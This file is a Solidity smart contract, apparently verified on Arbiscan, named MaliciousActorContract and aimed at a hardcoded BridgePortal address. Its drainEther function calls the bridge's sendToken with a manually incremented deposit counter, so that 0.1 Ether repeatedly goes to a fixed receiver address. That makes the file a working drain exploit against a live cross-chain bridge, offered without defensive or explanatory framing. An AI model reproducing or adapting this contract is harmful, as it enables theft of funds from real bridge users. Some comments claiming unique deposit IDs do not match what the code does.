/**
 *Submitted for verification at Arbiscan on 2023-08-03
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract MaliciousActorContract {
    address public bridgePortalAddress = 0x68c8a55F3d2f62487229Af226629D985FE2Dc7cb;

    // Counter to generate a unique depositId for each transaction
    uint256 private depositIdCounter;

    // Function to deposit Ether to the BridgePortal contract
    function depositEther() external payable {
        // Call the depositTransaction function of the BridgePortal contract
        // with a new unique depositId each time
        (bool success, ) = bridgePortalAddress.call{value: msg.value}(
            abi.encodeWithSignature("depositTransaction(address)", address(this))
        );
        require(success, "Deposit failed");
    }

    // Function to deposit ERC20 tokens to the BridgePortal contract
    function depositToken(address tokenAddress, uint256 amount) external {
        // Approve the BridgePortal contract to spend the tokens
        IERC20(tokenAddress).approve(bridgePortalAddress, amount);

        // Call the depositTransaction function of the BridgePortal contract
        // with a new unique depositId each time
        (bool success, ) = bridgePortalAddress.call(
            abi.encodeWithSignature("depositTransaction(address,uint256)", address(this), amount)
        );
        require(success, "Deposit failed");
    }

    // Function to get the current depositIdCounter value
    function getCurrentDepositId() external view returns (uint256) {
        return depositIdCounter;
    }

    // Function to increment the depositIdCounter
    function incrementDepositId() external {
        depositIdCounter++;
    }

    // Function to trigger the drain of 0.1 Ether from the BridgePortal contract
    function drainEther() external {
        // Set the receiver address (self) and the amount (0.1 Ether) to be sent
        address receiver = 0xf621de026c76eADF803b3248f57F87718b103160;
        uint256 amount = 0.1 ether;

        // Call the sendToken function of the BridgePortal contract to withdraw 0.1 Ether
        (bool success, ) = bridgePortalAddress.call(
            abi.encodeWithSignature("sendToken(address,uint256,uint256)", receiver, amount, depositIdCounter)
        );
        require(success, "Drain failed");

        // Increment the depositIdCounter to make sure each transaction is treated as a new deposit
        depositIdCounter++;
    }
}